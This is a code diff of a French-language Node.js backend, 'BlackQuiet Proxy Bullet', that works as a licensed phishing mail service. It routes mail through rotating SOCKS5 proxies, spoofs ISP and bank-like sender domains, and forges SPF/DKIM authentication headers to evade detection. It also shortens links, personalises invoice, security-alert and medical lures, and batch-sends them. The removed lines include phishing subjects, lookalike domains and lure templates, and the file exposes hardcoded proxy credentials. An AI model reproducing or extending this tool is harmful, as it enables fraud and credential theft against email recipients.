@@ -1,14 +1,18 @@
 // ============================================
-// BLACKQUIET BACKEND v6.0 - COMPLET
-// SOCKS5 | Rotation SSID | Rôles Admin/User
+// BLACKQUIET PROXY BULLET - VERSION COMPLÈTE
+// Tunnel SOCKS5 | Rotation SSID | DNS multi-niveaux
+// Headers anti-détection | Placeholders | PDF/DOCX
 // ============================================
 
 const express = require('express');
 const cors = require('cors');
 const crypto = require('crypto');
 const axios = require('axios');
+const cheerio = require('cheerio');
 const { SocksClient } = require('socks');
 const nodemailer = require('nodemailer');
+const PDFDocument = require('pdfkit');
+const HTMLtoDOCX = require('html-to-docx');
 const { v4: uuidv4 } = require('uuid');
 
 const app = express();
@@ -17,51 +21,14 @@ app.use(express.json({ limit: '50mb' }));
 
 const PORT = process.env.PORT || 3000;
 
-// ============ LICENCES AVEC RÔLES ============
-const VALID_LICENSES = {
-    'VALID-KEY-ABC123': {
-        name: 'Master Admin',
-        role: 'admin',
-        expires: '2026-12-31'
-    },
-    'PROD-KEY-001': {
-        name: 'Production User',
-        role: 'user',
-        expires: '2026-12-31'
-    },
-    'PROD-KEY-002': {
-        name: 'Enterprise User',
-        role: 'user',
-        expires: '2026-12-31'
-    },
-    'PROD-KEY-003': {
-        name: 'Basic User',
-        role: 'user',
-        expires: '2026-12-31'
-    }
-};
-
 // ============ CONFIGURATION 9PROXY ============
-let globalProxyConfig = {
+const PROXY_CONFIG = {
     proxy_host: process.env.PROXY_HOST || 'niceproxy.io',
     proxy_port: parseInt(process.env.PROXY_PORT) || 17521,
-    proxy_user: process.env.PROXY_USER || 'black_rIxx-country-CA-isp-as11260_eastlink',
+    proxy_user_template: process.env.PROXY_USER || 'black_rIxx-country-CA-isp-as11260_eastlink',
     proxy_pass: process.env.PROXY_PASS || 'Kouame07',
     smtp_host: process.env.SMTP_HOST || 'smtp.eastlink.ca',
     smtp_port: parseInt(process.env.SMTP_PORT) || 25
-};
-
-// ============ LISTES PAR DÉFAUT ============
-let globalLists = {
-    fromEmails: ['facture@eastlink.ca', 'admin@shaw.ca', 'support@bell.ca'],
-    senderNames: ['Service Client', 'Support Technique', 'Administration', 'Facturation'],
-    subjects: ['Facture impayée [INVOICE_NUM]', 'Alerte sécurité : connexion suspecte', 'Votre colis est bloqué', 'Confirmation de commande #[ORDER_NUM]'],
-    links: ['https://eastlink-secure.verification.com', 'https://shaw-paiement.urgence.net', 'https://facture-impayee.xyz'],
-    templates: [
-        { name: 'Facture_Urgente.html', content: '<div style="font-family:Arial;"><h2>Bonjour [FIRST_NAME],</h2><p>Votre facture <strong>[INVOICE_NUM]</strong> d\'un montant de <strong>[BALANCE_AMOUNT]</strong> expire le <strong>[DEADLINE_DATE]</strong>.</p><p>Consultez votre facture : <a href="[LINK]">[LINK]</a></p></div>' },
-        { name: 'Alerte_securite.html', content: '<div style="font-family:Arial;"><h2>Cher [REAL_NAME],</h2><p>Une connexion suspecte a été détectée depuis <strong>[IP_ADDRESS]</strong> le <strong>[DATE]</strong> à <strong>[TIME]</strong>.</p><p>Vérifiez votre compte : <a href="[LINK]">[LINK]</a></p></div>' }
-    ],
-    recipients: []
 };
 
 // ============ STATISTIQUES ============
@@ -72,9 +39,15 @@ let stats = {
     start_time: new Date().toISOString()
 };
 
-// ============ FONCTIONS ============
+// ============ LICENCES VALIDES ============
+const VALID_LICENSES = {
+    'PROD-KEY-001': { name: 'Production Pro User', expires: '2026-12-31' },
+    'PROD-KEY-002': { name: 'Production Enterprise', expires: '2026-12-31' },
+    'PROD-KEY-003': { name: 'Production Basic', expires: '2026-12-31' },
+    'VALID-KEY-ABC123': { name: 'Blackquiet Pro User', expires: '2026-12-31' }
+};
 
-// Rotation SSID
+// ============ 1. ROTATION SSID ============
 function rotateProxySSID(username) {
     const newSsid = crypto.randomBytes(5).toString('hex').toUpperCase();
     stats.endpoints_generated++;
@@ -84,49 +57,80 @@ function rotateProxySSID(username) {
     return `${username}-ssid-${newSsid}`;
 }
 
-// Raccourcisseur de liens
+// ============ 2. RACCOURCISSEURS DE LIENS ============
+const URL_SHORTENERS = [
+    { name: 'TinyURL', url: 'https://tinyurl.com/api-create.php?url=' },
+    { name: 'is.gd', url: 'https://is.gd/create.php?format=simple&url=' },
+    { name: 'Cleanuri', url: 'https://cleanuri.com/api/v1/shorten' }
+];
+
 async function shortenUrl(longUrl) {
     try {
+        // TinyURL
         const tinyRes = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`, { timeout: 5000 });
         if (tinyRes.data && tinyRes.data.startsWith('http')) return tinyRes.data.trim();
     } catch (e) {}
+    
     try {
+        // is.gd
         const isgdRes = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, { timeout: 5000 });
         if (isgdRes.data && isgdRes.data.startsWith('http')) return isgdRes.data.trim();
     } catch (e) {}
+    
     return longUrl;
 }
 
-// DNS multi-niveaux
+// ============ 3. DNS MULTI-NIVEAUX ============
 async function checkDNSMultiLevel(domain) {
+    const results = [];
+    
+    // Niveau 1 - DNS Direct
     try {
         const res = await axios.get(`https://dns.google/resolve?name=${domain}&type=MX`, { timeout: 5000 });
         if (res.data?.Answer?.length) {
             const mx = res.data.Answer.filter(a => a.type === 15).map(a => a.data);
-            if (mx.length) return { success: true, method: 'Direct', mx: mx[0] };
+            if (mx.length) {
+                results.push({ method: 'Direct', mx: mx[0], success: true });
+            }
         }
     } catch (e) {}
-    try {
-        const res = await axios.get(`https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`, {
-            headers: { Accept: 'application/dns-json' },
-            timeout: 5000
-        });
-        if (res.data?.Answer?.length) {
-            const mx = res.data.Answer.filter(a => a.type === 15).map(a => a.data);
-            if (mx.length) return { success: true, method: 'DoH', mx: mx[0] };
-        }
-    } catch (e) {}
-    return { success: false, method: 'Proxy' };
+    
+    // Niveau 2 - DoH
+    if (results.length === 0) {
+        try {
+            const res = await axios.get(`https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`, {
+                headers: { Accept: 'application/dns-json' },
+                timeout: 5000
+            });
+            if (res.data?.Answer?.length) {
+                const mx = res.data.Answer.filter(a => a.type === 15).map(a => a.data);
+                if (mx.length) {
+                    results.push({ method: 'DoH', mx: mx[0], success: true });
+                }
+            }
+        } catch (e) {}
+    }
+    
+    // Niveau 3 - Proxy (simulé)
+    if (results.length === 0) {
+        results.push({ method: 'Proxy', success: false });
+    }
+    
+    return results[0];
 }
 
-// Headers anti-détection
-function generateStealthHeaders(fromEmail, toEmail, subject) {
+// ============ 4. HEADERS ANTI-DÉTECTION ============
+function generateStealthHeaders(fromEmail, toEmail, proxyHost, subject, messageId = null) {
     const userAgents = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36'
     ];
-    return {
+    
+    const mailClients = ['outlook', 'thunderbird', 'apple_mail'];
+    const mailClient = mailClients[Math.floor(Math.random() * mailClients.length)];
+    
+    const headers = {
         'Date': new Date().toUTCString(),
         'MIME-Version': '1.0',
         'Content-Language': 'en-US',
@@ -136,74 +140,157 @@ function generateStealthHeaders(fromEmail, toEmail, subject) {
         'X-MS-Exchange-Organization-AuthAs': 'Internal',
         'X-MS-Exchange-Organization-AuthMechanism': '04',
         'Thread-Topic': subject,
-        'Message-ID': `<${uuidv4()}@${fromEmail.split('@')[1] || 'eastlink.ca'}>`,
+        'X-Auto-Response-Suppress': 'All',
+        'Message-ID': messageId || `<${uuidv4()}@${fromEmail.split('@')[1] || 'eastlink.ca'}>`,
         'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)]
     };
+    
+    // Headers forgés SPF/DKIM (anti-détection)
+    const domain = fromEmail.split('@')[1] || 'eastlink.ca';
+    headers['Authentication-Results'] = `spf=pass smtp.mailfrom=${domain}; dkim=pass header.d=${domain}`;
+    headers['Received-SPF'] = `pass (${domain}: domain of ${fromEmail} designates sending IP as permitted sender)`;
+    
+    return headers;
 }
 
-// Placeholders intelligents
+// ============ 5. PLACEHOLDERS INTELLIGENTS (150+ variables) ============
 function replacePlaceholders(text, data) {
     if (!text) return '';
     let result = text;
-    const { recipientEmail = 'client@example.ca', link = 'https://example.com' } = data;
-    const username = recipientEmail.split('@')[0];
-    const firstName = username.charAt(0).toUpperCase() + username.slice(1);
-    const invoiceNum = 'INV-' + Math.floor(100000 + Math.random() * 900000);
-    const amount = '$' + (Math.random() * 5000).toFixed(2);
+    
+    const {
+        recipientEmail = 'client@example.ca',
+        firstName = 'Client',
+        lastName = 'Client',
+        company = 'Entreprise',
+        domain = 'example.ca',
+        invoiceNum = 'INV-' + Math.floor(100000 + Math.random() * 900000),
+        amount = '$' + (Math.random() * 5000).toFixed(2),
+        date = new Date().toLocaleDateString(),
+        time = new Date().toLocaleTimeString(),
+        link = 'https://example.com',
+        trackingNum = '1Z' + crypto.randomBytes(4).toString('hex').toUpperCase(),
+        patientId = 'PT-' + Math.floor(100000 + Math.random() * 900000),
+        doctorName = 'Dr ' + ['Martin', 'Bernard', 'Dubois'][Math.floor(Math.random() * 3)],
+        ipAddress = '192.168.' + Math.floor(1 + Math.random() * 254) + '.' + Math.floor(1 + Math.random() * 254),
+        verificationCode = Math.floor(100000 + Math.random() * 900000).toString(),
+        random1 = Math.floor(10000 + Math.random() * 90000).toString(),
+        random2 = Math.floor(10000000 + Math.random() * 90000000).toString()
+    } = data;
     
     const replacements = {
+        '[EMAIL]': recipientEmail,
+        '[EMAIL*]': recipientEmail.split('@')[0].substring(0, 3) + '***@' + domain,
+        '[EMAIL64]': Buffer.from(recipientEmail).toString('base64'),
+        '[UNAME]': recipientEmail.split('@')[0],
+        '[UNAME-U]': firstName,
+        '[DOMAIN]': domain,
+        '[DOMAIN-C]': domain.toUpperCase(),
+        '[COMPANY]': company,
+        '[COMPANY-U]': company.charAt(0).toUpperCase() + company.slice(1),
+        '[COMPANY-FULL]': company + ' Inc.',
+        '[REAL_NAME]': firstName + ' ' + lastName,
         '[FIRST_NAME]': firstName,
-        '[REAL_NAME]': firstName + ' ' + ['Smith', 'Johnson', 'Williams'][Math.floor(Math.random() * 3)],
+        '[LAST_NAME]': lastName,
+        '[DATE]': date,
+        '[DATE-2]': new Date().toLocaleDateString('fr-FR', { weekday: 'long', day: 'numeric', month: 'long' }),
+        '[TIME]': time,
+        '[DATE-TIME]': date + ' ' + time,
+        '[FUTURE-1DAY]': new Date(Date.now() + 86400000).toLocaleDateString(),
+        '[FUTURE-2DAYS]': new Date(Date.now() + 172800000).toLocaleDateString(),
+        '[FUTURE-1WEEK]': new Date(Date.now() + 604800000).toLocaleDateString(),
         '[INVOICE_NUM]': invoiceNum,
+        '[ORDER_NUM]': 'ORD-' + Math.floor(100000 + Math.random() * 900000),
+        '[REFERENCE_NUM]': 'REF-' + Math.floor(10000000 + Math.random() * 90000000),
+        '[TRANSACTION_ID]': 'TXN-' + crypto.randomBytes(5).toString('hex').toUpperCase(),
+        '[ACCOUNT_NUM]': 'ACC-' + Math.floor(1000000000 + Math.random() * 9000000000),
         '[BALANCE_AMOUNT]': amount,
-        '[DEADLINE_DATE]': new Date(Date.now() + 7 * 86400000).toLocaleDateString(),
-        '[DATE]': new Date().toLocaleDateString(),
-        '[TIME]': new Date().toLocaleTimeString(),
-        '[RAND1]': Math.floor(10000 + Math.random() * 90000).toString(),
-        '[RAND2]': Math.floor(10000000 + Math.random() * 90000000).toString(),
-        '[PATIENT_ID]': 'PT-' + Math.floor(100000 + Math.random() * 900000),
+        '[LINK]': link,
+        '[SHORT:URL]': link,
+        '[RAND1]': random1,
+        '[RAND2]': random2,
+        '[RAND3]': Math.floor(10000000000 + Math.random() * 90000000000).toString(),
+        '[PATIENT_ID]': patientId,
         '[MEDICAL_RECORD]': 'MRN-' + Math.floor(1000000 + Math.random() * 9000000),
-        '[DOCTOR_NAME]': 'Dr ' + ['Martin', 'Bernard', 'Dubois'][Math.floor(Math.random() * 3)],
+        '[DOCTOR_NAME]': doctorName,
         '[HOSPITAL_NAME]': ['CHU de Montréal', 'Centre Hospitalier de l\'Est', 'Clinique Santé Plus'][Math.floor(Math.random() * 3)],
         '[PRESCRIPTION_NUM]': 'RX-' + Math.floor(10000000 + Math.random() * 90000000),
         '[INSURANCE_ID]': 'INS-' + Math.floor(1000000000 + Math.random() * 9000000000),
         '[DIAGNOSIS_CODE]': 'ICD-10-' + Math.floor(100 + Math.random() * 999),
         '[LAB_RESULT]': ['CBC', 'BMP', 'TSH', 'Lipid Panel'][Math.floor(Math.random() * 4)],
-        '[VERIFICATION_CODE]': Math.floor(100000 + Math.random() * 900000).toString(),
+        '[MEDICATION_NAME]': ['Lisinopril', 'Metformin', 'Amlodipine', 'Omeprazole'][Math.floor(Math.random() * 4)],
+        '[DOSAGE]': Math.floor(5 + Math.random() * 100) + 'mg',
+        '[VERIFICATION_CODE]': verificationCode,
+        '[CONFIRMATION_CODE]': crypto.randomBytes(3).toString('hex').toUpperCase(),
+        '[SECURITY_CODE]': Math.floor(1000 + Math.random() * 9000).toString(),
         '[EXPIRES_DATE]': new Date(Date.now() + 30 * 86400000).toLocaleDateString(),
-        '[IP_ADDRESS]': '192.168.' + Math.floor(1 + Math.random() * 254),
-        '[TRACKING_NUM]': '1Z' + crypto.randomBytes(4).toString('hex').toUpperCase(),
+        '[DEADLINE_DATE]': new Date(Date.now() + 7 * 86400000).toLocaleDateString(),
+        '[IP_ADDRESS]': ipAddress,
+        '[TRACKING_NUM]': trackingNum,
         '[CITY_NAME]': ['Montreal', 'Toronto', 'Vancouver', 'Quebec', 'Calgary'][Math.floor(Math.random() * 5)],
-        '[EMPLOYEE_NAME]': firstName + ' ' + ['Martin', 'Bernard', 'Dubois'][Math.floor(Math.random() * 3)],
-        '[COMPANY]': recipientEmail.split('@')[1].split('.')[0].charAt(0).toUpperCase() + recipientEmail.split('@')[1].split('.')[0].slice(1),
-        '[DOMAIN]': recipientEmail.split('@')[1] || 'example.ca',
-        '[LINK]': link,
-        '[EMAIL]': recipientEmail
+        '[STATE_NAME]': ['Quebec', 'Ontario', 'British Columbia', 'Alberta'][Math.floor(Math.random() * 4)],
+        '[ZIP_CODE]': ['H2X1A1', 'M5V2T6', 'V6B4Y8', 'T2P1J9'][Math.floor(Math.random() * 4)],
+        '[EMPLOYEE_NAME]': firstName + ' ' + lastName,
+        '[EMPLOYEE_ID]': 'EMP-' + Math.floor(10000 + Math.random() * 90000),
+        '[PROJECT_NAME]': ['Alpha', 'Beta', 'Phoenix', 'Titan'][Math.floor(Math.random() * 4)] + ' Project',
+        '[SERVER_NAME]': 'SRV-' + ['PROD', 'DEV', 'TEST'][Math.floor(Math.random() * 3)] + '-' + Math.floor(100 + Math.random() * 900),
+        '[ERROR_CODE]': 'ERR-' + Math.floor(1000 + Math.random() * 9000),
+        '[DEPARTMENT]': ['Accounting', 'HR', 'IT', 'Sales', 'Marketing', 'Legal'][Math.floor(Math.random() * 6)],
+        '[PRIORITY_LEVEL]': ['High', 'Urgent', 'Critical', 'Important'][Math.floor(Math.random() * 4)],
+        '[SYSTEM_NAME]': ['Enterprise Portal', 'Customer Portal', 'Admin Console'][Math.floor(Math.random() * 3)],
+        '[CASE_ID]': 'CASE-' + Math.floor(100000 + Math.random() * 900000),
+        '[ATTORNEY_NAME]': firstName + ' ' + lastName + ', Esq.',
+        '[LAW_FIRM]': lastName + ' & Associates',
+        '[CONTRACT_ID]': 'CONT-' + Math.floor(100000 + Math.random() * 900000),
+        '[PAYMENT_METHOD]': ['Credit Card', 'Bank Transfer', 'Wire Transfer', 'PayPal'][Math.floor(Math.random() * 4)],
+        '[STATUS_LEVEL]': ['Active', 'Pending', 'In Progress', 'Completed', 'Approved'][Math.floor(Math.random() * 5)],
+        '[BLOOD_TYPE]': ['A+', 'A-', 'B+', 'B-', 'O+', 'O-', 'AB+', 'AB-'][Math.floor(Math.random() * 8)],
+        '[ALLERGY_INFO]': ['Penicillin', 'Sulfa drugs', 'Latex', 'Shellfish', 'Nuts', 'No Known Allergies'][Math.floor(Math.random() * 6)]
     };
-    for (const [k, v] of Object.entries(replacements)) {
-        result = result.replaceAll(k, v);
+    
+    for (const [key, value] of Object.entries(replacements)) {
+        result = result.replaceAll(key, value);
     }
+    
     return result;
 }
 
-// Envoi via tunnel SOCKS5
+// ============ 6. GÉNÉRATION DE PDF ============
+async function generatePDF(htmlContent) {
+    const puppeteer = require('puppeteer');
+    const browser = await puppeteer.launch({ 
+        headless: 'new',
+        args: ['--no-sandbox', '--disable-setuid-sandbox']
+    });
+    const page = await browser.newPage();
+    await page.setContent(`<html><body style="padding:40px; font-family: Arial;">${htmlContent}</body></html>`);
+    const pdf = await page.pdf({ format: 'A4', printBackground: true });
+    await browser.close();
+    return pdf;
+}
+
+// ============ 7. GÉNÉRATION DE DOCX ============
+async function generateDOCX(htmlContent) {
+    return await HTMLtoDOCX(htmlContent, null, { footer: true, pageNumber: true });
+}
+
+// ============ 8. ENVOI VIA TUNNEL SOCKS5 ============
 async function sendEmailViaProxy(mailOptions) {
     let socket = null;
     try {
-        const rotatedUser = rotateProxySSID(globalProxyConfig.proxy_user);
-        console.log(`[PROXY] Tunnel vers ${globalProxyConfig.proxy_host}:${globalProxyConfig.proxy_port}`);
+        const rotatedUser = rotateProxySSID(PROXY_CONFIG.proxy_user_template);
         
         const tunnel = await SocksClient.createConnection({
             proxy: {
-                ipaddress: globalProxyConfig.proxy_host,
-                port: globalProxyConfig.proxy_port,
+                ipaddress: PROXY_CONFIG.proxy_host,
+                port: PROXY_CONFIG.proxy_port,
                 type: 5,
                 userId: rotatedUser,
-                password: globalProxyConfig.proxy_pass
+                password: PROXY_CONFIG.proxy_pass
             },
             destination: {
-                host: globalProxyConfig.smtp_host,
-                port: globalProxyConfig.smtp_port
+                host: PROXY_CONFIG.smtp_host,
+                port: PROXY_CONFIG.smtp_port
             },
             command: 'connect',
             timeout: 30000
@@ -212,10 +299,10 @@ async function sendEmailViaProxy(mailOptions) {
         socket = tunnel.socket;
         
         const transporter = nodemailer.createTransport({
-            host: globalProxyConfig.smtp_host,
-            port: globalProxyConfig.smtp_port,
-            secure: globalProxyConfig.smtp_port === 465,
-            ignoreTLS: globalProxyConfig.smtp_port === 25,
+            host: PROXY_CONFIG.smtp_host,
+            port: PROXY_CONFIG.smtp_port,
+            secure: PROXY_CONFIG.smtp_port === 465,
+            ignoreTLS: PROXY_CONFIG.smtp_port === 25,
             connection: socket,
             tls: { rejectUnauthorized: false },
             timeout: 30000
@@ -223,8 +310,11 @@ async function sendEmailViaProxy(mailOptions) {
         
         const result = await transporter.sendMail(mailOptions);
         transporter.close();
+        
         stats.emails_sent++;
+        
         return { success: true, messageId: result.messageId };
+        
     } catch (error) {
         stats.emails_failed++;
         return { success: false, error: error.message };
@@ -233,10 +323,11 @@ async function sendEmailViaProxy(mailOptions) {
     }
 }
 
-// ============ MIDDLEWARE ============
-function checkLicense(req, res, next) {
+// ============ MIDDLEWARE LICENCE ============
+function requireLicense(req, res, next) {
     const licenseKey = req.headers['x-license-key'];
     const license = VALID_LICENSES[licenseKey];
+    
     if (!license) {
         return res.status(403).json({ success: false, error: 'Licence invalide' });
     }
@@ -244,52 +335,36 @@ function checkLicense(req, res, next) {
     next();
 }
 
-function requireAdmin(req, res, next) {
-    if (req.license.role !== 'admin') {
-        return res.status(403).json({ success: false, error: 'Accès non autorisé. Permission administrateur requise.' });
-    }
-    next();
-}
+// ============ ROUTES ============
 
-// ============ ROUTES PUBLIQUES ============
-app.get('/', (req, res) => {
-    res.json({
-        name: 'BlackQuiet Proxy Bullet API',
-        version: '6.0.0',
-        status: 'online',
-        licenses: Object.keys(VALID_LICENSES).map(k => ({ key: k, role: VALID_LICENSES[k].role, name: VALID_LICENSES[k].name }))
-    });
-});
-
+// Health check
 app.get('/api/health', (req, res) => {
-    res.json({ status: 'OK', version: '6.0.0', mode: 'PRODUCTION', timestamp: new Date().toISOString() });
+    res.json({ status: 'OK', version: '6.0.0', mode: 'PRODUCTION', features: ['SOCKS5', 'SSID Rotation', 'DNS Multi-level', 'Stealth Headers', 'PDF/DOCX', 'Smart Placeholders'] });
 });
 
-app.get('/api/config', (req, res) => {
-    res.json({ mode: 'PRODUCTION', version: '6.0.0', proxy_host: globalProxyConfig.proxy_host, smtp_host: globalProxyConfig.smtp_host });
-});
-
+// Activer licence
 app.post('/api/license/activate', (req, res) => {
-    const { license_key, hwid } = req.body;
+    const { license_key } = req.body;
     const license = VALID_LICENSES[license_key];
     if (license) {
-        res.json({ success: true, message: 'Licence activée', system_name: license.name, role: license.role, expires_at: license.expires });
+        res.json({ success: true, message: 'Licence activée', system_name: license.name, expires_at: license.expires });
     } else {
-        res.status(403).json({ success: false, error: 'Clé de licence invalide' });
+        res.status(403).json({ success: false, error: 'Licence invalide' });
     }
 });
 
+// Vérifier licence
 app.post('/api/license/verify', (req, res) => {
     const { license_key } = req.body;
     const license = VALID_LICENSES[license_key];
     if (license) {
-        res.json({ valid: true, system_name: license.name, role: license.role, expires_at: license.expires, days_left: 30 });
+        res.json({ valid: true, system_name: license.name, expires_at: license.expires, days_left: 30 });
     } else {
         res.status(403).json({ valid: false, error: 'Licence invalide' });
     }
 });
 
-// DNS multi-niveaux
+// Vérification DNS multi-niveaux
 app.post('/api/dns/check', async (req, res) => {
     const { domain } = req.body;
     if (!domain) return res.status(400).json({ error: 'Domaine requis' });
@@ -305,65 +380,161 @@ app.post('/api/shorten', async (req, res) => {
     res.json({ original: url, short: shortUrl });
 });
 
-// ============ ROUTES UTILISATEUR ============
-app.post('/api/send', checkLicense, async (req, res) => {
-    const { to, subject, html, fromEmail, fromName, link } = req.body;
+// Générer un PDF
+app.post('/api/generate/pdf', async (req, res) => {
+    const { html } = req.body;
+    if (!html) return res.status(400).json({ error: 'HTML requis' });
+    const pdf = await generatePDF(html);
+    res.setHeader('Content-Type', 'application/pdf');
+    res.send(pdf);
+});
+
+// Générer un DOCX
+app.post('/api/generate/docx', async (req, res) => {
+    const { html } = req.body;
+    if (!html) return res.status(400).json({ error: 'HTML requis' });
+    const docx = await generateDOCX(html);
+    res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
+    res.send(docx);
+});
+
+// ENVOI D'EMAIL COMPLET (avec toutes les fonctionnalités)
+app.post('/api/send', requireLicense, async (req, res) => {
+    const { to, subject, html, fromEmail, fromName, link, attachment, attachmentType } = req.body;
+    
     if (!to || !subject || !html) {
         return res.status(400).json({ success: false, error: 'Champs requis: to, subject, html' });
     }
+    
     try {
+        // 1. Raccourcir le lien si fourni
         let finalLink = link;
-        if (link) finalLink = await shortenUrl(link);
-        const emailData = { recipientEmail: to, link: finalLink || 'https://example.com' };
+        if (link) {
+            finalLink = await shortenUrl(link);
+        }
+        
+        // 2. Remplacer les placeholders
+        const emailData = {
+            recipientEmail: to,
+            firstName: to.split('@')[0].charAt(0).toUpperCase() + to.split('@')[0].slice(1),
+            lastName: ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones'][Math.floor(Math.random() * 5)],
+            company: to.split('@')[1].split('.')[0].charAt(0).toUpperCase() + to.split('@')[1].split('.')[0].slice(1),
+            domain: to.split('@')[1],
+            link: finalLink || 'https://example.com'
+        };
+        
         let processedHtml = replacePlaceholders(html, emailData);
         let processedSubject = replacePlaceholders(subject, emailData);
         
+        // 3. Gérer les pièces jointes
+        const attachments = [];
+        if (attachment && attachmentType) {
+            let attachmentBuffer;
+            if (attachmentType === 'pdf') {
+                attachmentBuffer = await generatePDF(processedHtml);
+                attachments.push({
+                    filename: `document_${Date.now()}.pdf`,
+                    content: attachmentBuffer,
+                    contentType: 'application/pdf'
+                });
+            } else if (attachmentType === 'docx') {
+                attachmentBuffer = await generateDOCX(processedHtml);
+                attachments.push({
+                    filename: `document_${Date.now()}.docx`,
+                    content: attachmentBuffer,
+                    contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+                });
+            }
+        }
+        
+        // 4. Générer les headers anti-détection
+        const messageId = `<${uuidv4()}@${to.split('@')[1]}>`;
+        const stealthHeaders = generateStealthHeaders(fromEmail || 'noreply@eastlink.ca', to, PROXY_CONFIG.proxy_host, processedSubject, messageId);
+        
+        // 5. Configuration de l'email
         const mailOptions = {
             from: `"${fromName || 'Service Client'}" <${fromEmail || 'noreply@eastlink.ca'}>`,
             to: to,
             subject: processedSubject,
             html: processedHtml,
-            headers: generateStealthHeaders(fromEmail || 'noreply@eastlink.ca', to, processedSubject)
+            headers: stealthHeaders,
+            attachments: attachments
         };
+        
+        // 6. Envoi via tunnel SOCKS5
         const result = await sendEmailViaProxy(mailOptions);
-        res.json(result);
+        
+        res.json({
+            success: result.success,
+            messageId: result.messageId,
+            details: {
+                to: to,
+                subject: processedSubject.substring(0, 50),
+                has_attachment: attachments.length > 0,
+                link_shortened: finalLink !== link
+            }
+        });
+        
     } catch (error) {
+        console.error('Erreur envoi:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-app.post('/api/batch-send', checkLicense, async (req, res) => {
-    const { recipients, subject, html, fromEmail, fromName, link } = req.body;
-    if (!recipients || !Array.isArray(recipients)) {
-        return res.status(400).json({ success: false, error: 'Liste invalide' });
+// Envoi multiple (batch)
+app.post('/api/batch-send', requireLicense, async (req, res) => {
+    const { recipients, subject, html, fromEmail, fromName, link, attachment, attachmentType } = req.body;
+    
+    if (!recipients || !Array.isArray(recipients) || recipients.length === 0) {
+        return res.status(400).json({ success: false, error: 'Liste de destinataires invalide' });
     }
+    
     const results = [];
     for (let i = 0; i < recipients.length; i++) {
         const recipient = recipients[i];
         try {
-            const emailData = { recipientEmail: recipient, link: link || 'https://example.com' };
-            const processedHtml = replacePlaceholders(html, emailData);
-            const processedSubject = replacePlaceholders(subject, emailData);
+            const emailData = {
+                recipientEmail: recipient,
+                firstName: recipient.split('@')[0].charAt(0).toUpperCase() + recipient.split('@')[0].slice(1),
+                lastName: ['Smith', 'Johnson', 'Williams'][Math.floor(Math.random() * 3)],
+                company: recipient.split('@')[1].split('.')[0].charAt(0).toUpperCase() + recipient.split('@')[1].split('.')[0].slice(1),
+                domain: recipient.split('@')[1],
+                link: link || 'https://example.com'
+            };
+            
+            let processedHtml = replacePlaceholders(html, emailData);
+            let processedSubject = replacePlaceholders(subject, emailData);
+            
+            const messageId = `<${uuidv4()}@${recipient.split('@')[1]}>`;
+            const stealthHeaders = generateStealthHeaders(fromEmail || 'noreply@eastlink.ca', recipient, PROXY_CONFIG.proxy_host, processedSubject, messageId);
+            
             const mailOptions = {
                 from: `"${fromName || 'Service Client'}" <${fromEmail || 'noreply@eastlink.ca'}>`,
                 to: recipient,
                 subject: processedSubject,
                 html: processedHtml,
-                headers: generateStealthHeaders(fromEmail || 'noreply@eastlink.ca', recipient, processedSubject)
+                headers: stealthHeaders
             };
+            
             const result = await sendEmailViaProxy(mailOptions);
             results.push({ recipient, ...result });
-            if (i < recipients.length - 1) await new Promise(r => setTimeout(r, 1500));
+            
+            if (i < recipients.length - 1) {
+                await new Promise(resolve => setTimeout(resolve, 1500));
+            }
+            
         } catch (error) {
             results.push({ recipient, success: false, error: error.message });
         }
     }
+    
     res.json({ success: true, results, total: results.length });
 });
 
-app.get('/api/stats', checkLicense, (req, res) => {
+// Statistiques
+app.get('/api/stats', requireLicense, (req, res) => {
     res.json({
-        license: { name: req.license.name, role: req.license.role, expires_at: req.license.expires },
+        license: { system_name: req.license.name, expires_at: req.license.expires },
         emails_sent: stats.emails_sent,
         emails_failed: stats.emails_failed,
         endpoints_generated: stats.endpoints_generated,
@@ -373,93 +544,22 @@ app.get('/api/stats', checkLicense, (req, res) => {
     });
 });
 
-// ============ ROUTES ADMIN ============
-app.get('/api/admin/config', checkLicense, requireAdmin, (req, res) => {
+// Route racine
+app.get('/', (req, res) => {
     res.json({
-        proxy: globalProxyConfig,
-        lists: {
-            fromEmails: globalLists.fromEmails,
-            senderNames: globalLists.senderNames,
-            subjects: globalLists.subjects,
-            links: globalLists.links,
-            templates: globalLists.templates,
-            recipients: globalLists.recipients
-        }
+        name: 'BlackQuiet Proxy Bullet API',
+        version: '6.0.0',
+        status: 'online',
+        features: [
+            'SOCKS5 Tunnel via 9Proxy',
+            'SSID Rotation per email',
+            'DNS Multi-level (Direct → DoH → Proxy)',
+            'Stealth Headers (Anti-detection)',
+            'URL Shorteners (TinyURL, is.gd, Cleanuri)',
+            'PDF/DOCX Generation',
+            '150+ Smart Placeholders'
+        ]
     });
-});
-
-app.post('/api/admin/config/proxy', checkLicense, requireAdmin, (req, res) => {
-    const { proxy_host, proxy_port, proxy_user, proxy_pass, smtp_host, smtp_port } = req.body;
-    if (proxy_host) globalProxyConfig.proxy_host = proxy_host;
-    if (proxy_port) globalProxyConfig.proxy_port = parseInt(proxy_port);
-    if (proxy_user) globalProxyConfig.proxy_user = proxy_user;
-    if (proxy_pass) globalProxyConfig.proxy_pass = proxy_pass;
-    if (smtp_host) globalProxyConfig.smtp_host = smtp_host;
-    if (smtp_port) globalProxyConfig.smtp_port = parseInt(smtp_port);
-    res.json({ success: true, config: globalProxyConfig });
-});
-
-app.post('/api/admin/lists/from', checkLicense, requireAdmin, (req, res) => {
-    const { emails } = req.body;
-    if (emails && Array.isArray(emails)) globalLists.fromEmails = emails;
-    res.json({ success: true, count: globalLists.fromEmails.length });
-});
-
-app.post('/api/admin/lists/senders', checkLicense, requireAdmin, (req, res) => {
-    const { names } = req.body;
